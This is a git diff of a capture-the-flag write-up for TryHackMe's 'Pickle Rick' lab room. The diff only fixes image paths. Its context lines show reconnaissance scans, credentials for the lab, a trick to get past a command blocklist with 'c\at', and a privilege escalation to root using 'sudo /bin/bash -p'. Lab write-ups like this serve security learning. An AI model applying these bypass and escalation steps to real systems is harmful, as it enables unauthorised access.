@@ -4,9 +4,9 @@ Pickle Rick CTF is a beginner friendly room on TryHackme, Theme based on Rick an
 ```bash
 $ sudo nmap -sS -sC -sV MACHINE_IP
 ```
-![alt text](/images/nmap.png)
+![alt text](images/nmap.png)
 
-![alt text](/images/source%20page.png)
+![alt text](images/source%20page.png)
 
 we found a username on source page: ```R1ckRul3s```
 
@@ -16,17 +16,17 @@ we found a username on source page: ```R1ckRul3s```
 $ gobuster dir -u http://MACHINE_IP -w /wordlist-dir -x php,txt
 ```
 
-![alt text](/images/gobuster.png)
+![alt text](images/gobuster.png)
 
 ## robots.txt
 
-![alt text](/images/robots.png)
+![alt text](images/robots.png)
 
 string: ```Wubbalubbadubdub```
 
 ## login to portal
 
-![alt text](/images/login%20page.png)
+![alt text](images/login%20page.png)
 
 ```sql
 creds found
@@ -34,7 +34,7 @@ username: R1ckRul3s
 password: Wubbalubbadubdub
 ```
 
-![alt text](/images/command.png)
+![alt text](images/command.png)
 
 ### we have restrictions on commands we run 
 We can bypass disabled commands, use ```c\at``` or ```less``` instead of ```cat``` 
@@ -74,7 +74,7 @@ www-data@ip-10-10-195-52:/home/ubuntu$ sudo /bin/bash -p
 root@ip-10-10-195-52:/home/ubuntu# whoami
 root
 ```
-![alt text](/images/root.png)
+![alt text](images/root.png)
 
 we are root now 
 
